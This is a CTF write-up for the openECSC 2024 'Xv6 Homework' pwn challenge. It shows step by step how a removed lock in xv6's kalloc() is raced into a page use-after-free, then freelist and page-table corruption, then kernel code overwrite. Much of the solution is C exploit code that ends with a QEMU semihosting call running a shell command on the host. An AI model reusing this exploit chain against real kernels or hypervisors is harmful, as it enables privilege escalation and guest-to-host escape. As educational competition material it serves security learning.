# openECSC 2024 - Round 3

## [pwn] Xv6 Homework (13 solves)

My operating systems professor is teaching us using xv6. The last lecture was
on locking, chapter 6 of [the book][book]. At the end of the lecture, the
professor pointed us to section 6.10 exercise 1, which states:

> Comment out the calls to `acquire` and `release` in `kalloc`
> (`kernel/kalloc.c:69`). This seems like it should cause problems for kernel
> code that calls `kalloc`; what symptoms do you expect to see? When you run
> xv6, do you see these symptoms? How about when running `usertests`? If you
> don’t see a problem, why not? See if you can provoke a problem by inserting
> dummy loops into the critical section of `kalloc`.

Can you help me write a decent answer before the next lecture?

```text
nc xv6homework.challs.open.ecsc2024.it 38099
```

Author: Marco Bonelli <@mebeim>

### Description

The challenge consists of a rather simple patch to [xv6][xv6], a simple RISC-V
64-bit operating system developed as an educational tool for MIT Operating
Systems course 6.1810. The source code is hosted on GitHub at
[mit-pdos/xv6-riscv][xv6-riscv].

Apart from other small changes to make the remote challenge a bit more stable,
the core of the patch is the following:

```diff
diff --git a/Makefile b/Makefile
index 39a99d7..59eca3b 100644
--- a/Makefile
+++ b/Makefile
@@ -160,6 +160,7 @@ QEMUOPTS = -machine virt -bios none -kernel $K/kernel -m 128M -smp $(CPUS) -nogr
 QEMUOPTS += -global virtio-mmio.force-legacy=false
 QEMUOPTS += -drive file=fs.img,if=none,format=raw,id=x0
 QEMUOPTS += -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0
+QEMUOPTS += -semihosting

 qemu: $K/kernel fs.img
  $(QEMU) $(QEMUOPTS)
diff --git a/kernel/kalloc.c b/kernel/kalloc.c
index 0699e7e..4fd9012 100644
--- a/kernel/kalloc.c
+++ b/kernel/kalloc.c
@@ -70,11 +70,9 @@ kalloc(void)
 {
   struct run *r;

-  acquire(&kmem.lock);
   r = kmem.freelist;
   if(r)
     kmem.freelist = r->next;
-  release(&kmem.lock);

   if(r)
     memset((char*)r, 5, PGSIZE); // fill with junk
```

As we can se above, the two calls to `acquire()` and `release()` were removed
in the `kalloc()` function, exactly as exercise 1 of section 6.10 of the
[xv6 book][xv6-book] states.

Additionally, `-semihosting` is added to the default QEMU command line of the
`Makefile` that can be used to run the operating system after compiling it. This
command line option enables the semihosting capability of QEMU, which is
implemented for different architectures, including RISC-V 64-bit.

This allows guest kernel code (and if configured also guest user code) to issue
what essentially are hypercalls to QEMU to perform different actions on the
host. The actions that can be performed by the guest on the host through
semihosting include open/reading/writing files, running arbitrary commands, and
more. A few blog posts ([example][blogpost-1]) exist as well as
[official documentation][riscv-semihosting-repo] about this feature.

In the specific case of this challenge, semihosting was enabled as a way to
prove that arbitrary kernel code execution was achieved. The flag is in fact
placed *outside* the xv6 filesystem, in the QEMU host filesystem. This is also
because xv6 does not implement users or file permissions, so putting the flag in
the xv6 filesystem would have made it directly readable.

### Bug

The introduced bug is very clear from the provided diff:

```diff
-  acquire(&kmem.lock);
   r = kmem.freelist;
   if(r)
     kmem.freelist = r->next;
-  release(&kmem.lock);
```

The lack of locking around the critical section of `kalloc()` allows for
multiple concurrent kernel allocations to race and operate on `kmem.freelist` at
the same time, popping the same page multiple times or even breaking the linked
list and causing the kernel to panic. Furthermore, the locking in `kfree()`,
which uses the same `kmem.lock`, is essentially made useless by the removal of
the locking in `kalloc()`, so it is also possible to race allocations with
deallocations.

### Solution

If we manage to make two different processes obtain the same page, we can then
free it in one process and put it back in the kernel free list while the second
process is still holding a vaild virtual mapping for the page, causing a page
use-after-free.

The only important thing for this to happen is that both reads at
`r = kmem.freelist` happen before the linked list is advanced
at `kmem.freelist = r->next`.

Although `kalloc()` is used in a lot of places in the xv6 source code, one of
the simplest way to reach it from userspace is the `sbrk` syscall
([kernel/sysproc.c:39][xv6-src-sys_sbrk]). The call chain is:
[`sys_sbrk()`][xv6-src-sys_sbrk] -> [`growproc()`][xv6-src-growproc] ->
[`uvmalloc()`][xv6-src-uvmalloc] -> [`kalloc()`][xv6-src-kalloc]. In particular,
`uvmalloc()` does a `for` loop depending on the number of new pages requested
through `sbrk` and calls `kalloc()` once per iteration. This makes it a perfect
candidate to trigger the race condition.

The setup is simple: create two processes and make them both call `sbrk` at the
same time with a large enough request to hit the race with high reliability, for
example `sbrk(0x1000 * 1000)` will request 1000 pages, so 1000 calls to
`kalloc()`.

Once both `sbrk()` syscalls complete, there is a high probability that some of
the pages were obtained by both processes at the same time. We can then let one
of the two processes release the pages while the second one still holds valid
virtual mappings to them.

Here's how this can be achieved:

```c
#define KFREE_PAGES 1000

if (fork() == 0) {
	sbrk(0x1000 * KFREE_PAGES); // **RACE SIDE A**
	exit(0); // die and release all pages
}

void *brk = sbrk(0x1000 * KFREE_PAGES); // **RACE SIDE B**
wait(0);
```

One problem to avoid though is that when the pages are released the kernel will
call `kfree()` for each page. This makes it very easy to race `kfree()` with
`kalloc()` if the child process above returns from `sbrk` and starts exiting
before the parent finishes its own `sbrk`.

Racing `kfree()` with `kalloc()` in this way can easily corrupt the free list
and crash the kernel, so we should try to avoid it. To do this, we can create a
pipe and use it to synchronize the parent and the child as follows:

```c
int pipe_fds[2];
pipe(pipe_fds);

if (fork() == 0) {
	char tmp;
	sbrk(0x1000 * KFREE_PAGES); // **RACE SIDE A**
	// Wait for parent to finish to avoid concurrent kfree() and kalloc().
	read(pipe_fds[0], &tmp, 1);
	// Exiting will kfree() all the previously pages allocated pages.
	exit(0);
}

void *brk = sbrk(0x1000 * KFREE_PAGES); // **RACE SIDE B**
// Signal child that we are done with sbrk() so it can exit and kfree() its pages.
write(pipe_fds[1], "!", 1);
wait(0);
```

Now in order to check if any of the pages still mapped by the parent were in
fact freed, we can check their contents. The `kfree()` poisons free pages with
`0x01` before adding them back in freelist in order to detect errors, so we can
simply check for that value:

```c
uint64 *page;

for (int i = SBRK_PAGES - 1; i > 0; i--) {
	page = (uint64 *)&brk[i * 0x1000];

	if (page[1] == 0x0101010101010101UL) {
		fprintf(2, "UAF page: va=%p, next=%p\n", page, page[0]);
		break;
	}
}

// `page` now points to free physical memory
```

We do the above loop in reverse since pages are freed in reverse allocation
order so the first one we hit will be the closest to the freelist head
(`kmem.freelist`).

Once we find a free page, we can then overwrite its first 8 bytes, holding the
`->next` freelist pointer:

```c
page[0] = arbitrary_paddr;
```

And after a few allocations with `sbrk` we will re-obtain the same page again,
and the `arbitrary_paddr` we wrote will be the head of the free list. The next
page we allocate will map `arbitrary_paddr` in our page table, which effectively
gives us arbitary physical R/W.

In order to detect when the page is re-allocated we can simply keep requesting
pages until the page is no longer filled with `0x01`. This is because
`kalloc()`, similarly to `kfree()` poisons the page right after allocation
filling it with `0x05`. On the next allocation, `kalloc()` will return
`arbitrary_paddr`.

```c
page[0] = arbitrary_paddr;

do {
	sbrk(0x1000);
} while (page[1] == 0x0101010101010101UL);

uint64 *fake = (uint64 *)sbrk(0x1000);

// Write to arbitary_paddr
fake[0] = 123;
```

We now write memory at arbitrary physical addresses, but we need to be careful
because of the poisoning done by `kalloc()`, which will write `0x1000` bytes of
poison values (`0x01`) before the physical address is mapped into our page
tables. This means that we cannot easily directly overwrite kernel text as doing
`page[0] = some_kernel_text_paddr;` will wipe out an entire page worth of kernel
code and most likely result in a panic/crash.

Since no kernel address space layout randomization is implemented by xv6, and
the kernel basically operates with a fixed 1:1 mapping of physical memory, we
can pretty easily predict where the page tables of our process will be located,
and overwrite those. A simple check with GDB is enough to find out. We can
extract the `kernel` binary from the Docker container, set a breakpoint on the
[`uvmalloc()`][xv6-src-uvmalloc] function before launching our program, and
check its first argument (`pagetable_t pagetable`) to reveal the physical
address of our page tables.

```sh
docker cp xv6_homework:/home/user/kernel .
readelf -s kernel | grep uvmalloc
# attach to QEMU with GDB and set breakpoint
```

Once the top-level page table of our process is identified, we can point the
corrupted `kmem.freelist` pointer to it. Once this is done, we can then create
fake page table entries to map any physical address we want and write to it
directly. The xv6 kernel sets up 3-level page tables, so we can allocate a
couple of fake pages with an initial `sbrk()` call. Their physical address will
also be 100% predictable, and we can find it inspecting with GDB the return
value of [`sys_sbrk()`][xv6-src-sys_sbrk]).

```c
// Found through GDB, 100% predictable
static const uint64 my_pagetable_pa = 0x87f42000UL;
static const uint64 table_lvl1_pa   = 0x87f43000UL;
static const uint64 table_lvl0_pa   = 0x87f72000UL;

int main(void) {
	// Allocate two pages for fake page table entries, which will have
	// physical address table_lvl1_pa and table_lvl0_pa.
	uint64 *const table_lvl1 = (uint64 *)sbrk(0x2000);
	uint64 *const table_lvl0 = table_lvl1 + 512;

	uint64 *page = /* perform race and get UAF page... */

	// Point kmem.freelist into our top level (lvl2) page table
	page[0] = my_pagetable_pa + 0x100 * 8;

	do {
		sbrk(0x1000);
	} while (page[1] == 0x0101010101010101UL);

	// Map our own page table
	uint64 *my_pagetable = (uint64 *)sbrk(0x1000);
	// ...
}
```

Due to xv6 design, the top level page table of any process will always have two
entries at index `0xff`: one for the "trapframe" (virtual address
`0x3fffffe000`) and one for the "trampoline" (virtual address `0x3ffffff000`),
which are used for syscall handling. This is the reason for the `+ 0x100 * 8`
in the above code. If we don't skip those, they will be overwritten by
`kalloc()` with poison bytes and the next syscall will cause a panic.

Now that we have a pointer to our own top level page table, we can create fake
entries to point to some kernel function and overwrite it with our own code. A
random syscall is the perfect choice for this, and we can find its (fixed)
physical address easily with `readelf`.

```c
const uint64 sys_uptime_pa = 0x80002d3cUL;
my_pagetable[1] = ((table_lvl1_pa >> 12) << 10) | 0x1; // valid
table_lvl1[0]   = ((table_lvl0_pa >> 12) << 10) | 0x1; // valid
table_lvl0[0]   = (((sys_uptime_pa & ~0xfffUL) >> 12) << 10) | 0x17; // valid, RW, user

// Virtual address that will follow the fake page table entries we just set up
uint64 *const sys_uptime = (uint64 *)((1 << (12 + 9 + 9)) + (sys_uptime_pa & 0xfff));
```

Writing through the `sys_uptime` poiter will now overwrite kernel code. What do
we write there? As the [challenge readme](./src/PLAYER_README.md) states, the
flag is in the QEMU host, and we need to leverage the "semihosting" feature of
QEMU to get it.

Making a semihosting call simply consists of writing a special sequence of
instruction (non compressed) RISCV-64 instructions surrounding an `ebreak`. As
already mentioned earlier, a few blog posts and examples canbe found online
about this. The `SYS_SYSTEM` semihosting call gives us a shell on the host, so
that's sweet.

We will need to write the semihosting call arguments to some physical address
that is readable from kernel mode, as `SYS_SYSTEM` takes a pointer to a struct
of the following form:

```c
struct system_args {
 char *cmd;
 uint64_t cmd_length;
}
```

We can simply reuse one of the fake page tables for this:

```c
// Found through GDB, 100% predictable
static const uint64 my_pagetable_pa  = 0x87f42000UL;
static const uint64 table_lvl1_pa    = 0x87f43000UL;
static const uint64 table_lvl0_pa    = 0x87f72000UL;
// Borrow for level 0 tbl semihosting args
static const uint64 semihost_args_pa = table_lvl0_pa + 0x800;

int main(void) {
	// ...

	uint64 *const table_lvl1 = (uint64 *)sbrk(0x2000);
	uint64 *const table_lvl0 = table_lvl1 + 512;
	uint64 *const semihost_args = table_lvl0 + (0x800 / 8);
	const char *const cmd = "cat flag";

	// Setup semihosting call args for later use by kernel code
	semihost_args[0] = semihost_args_pa + 0x10;
	semihost_args[1] = strlen(cmd);
	memcpy(semihost_args + 2, cmd, strlen(cmd));

	// ...
}
```

Now we can finally set up the semihosting call as follows:

```c
static inline int __attribute__((always_inline)) semihost_call(int num, uint64 args) {
	register int val asm ("a0") = num;
	register uint64 pargs asm ("a1") = args;

	asm volatile (
		".option push\n"
		".option norvc\n"
		".align 4\n"
		"slli x0, x0, 0x1f\n"
		"ebreak\n"
		"srai x0, x0, 0x7\n"
		".option pop\n"
		: "=r" (val)
		: "0" (val), "r" (pargs)
		: "memory"
	);

	return val;
}

extern char expl_end[];
static void expl(void) {
	// Call system() on the host
	semihost_call(SEMIHOST_SYS_SYSTEM, semihost_args_pa);

	// Label for memcpy in main()
	asm volatile (
		".globl expl_end\n"
		"expl_end:"
	);
}
```

And finally, back in our main, overwrite `sys_uptime()` with the above code and
call it:

```c
int main(void) {
	// ...

	// Replace sys_uptime with expl() code
	memcpy(sys_uptime, &expl, (uint64)expl_end - (uint64)expl);
	// Get kernel ACE
	uptime();

	return 0;
}
```

### Complete exploit

See [`src/expl.c`](src/expl.c) for the C exploit source code and
[`checker/__main__.py`](checker/__main__.py) for the automated script that
uploads the compiled binary to the challenge server.

[xv6]: https://pdos.csail.mit.edu/6.1810/2023/xv6.html
[xv6-book]: https://pdos.csail.mit.edu/6.1810/2023/xv6/book-riscv-rev3.pdf
[xv6-riscv]: https://github.com/mit-pdos/xv6-riscv
[blogpost-1]: https://embeddedinn.com/articles/tutorial/understanding-riscv-semihosting/
[riscv-semihosting-repo]: https://github.com/riscv-non-isa/riscv-semihosting

[xv6-src-sys_sbrk]: https://github.com/mit-pdos/xv6-riscv/blob/f5b93ef12f7159f74f80f94729ee4faabe42c360/kernel/sysproc.c#L39
[xv6-src-growproc]: https://github.com/mit-pdos/xv6-riscv/blob/f5b93ef12f7159f74f80f94729ee4faabe42c360/kernel/proc.c#L260
[xv6-src-uvmalloc]: https://github.com/mit-pdos/xv6-riscv/blob/f5b93ef12f7159f74f80f94729ee4faabe42c360/kernel/vm.c#L226
[xv6-src-kalloc]: https://github.com/mit-pdos/xv6-riscv/blob/f5b93ef12f7159f74f80f94729ee4faabe42c360/kernel/kalloc.c#L69
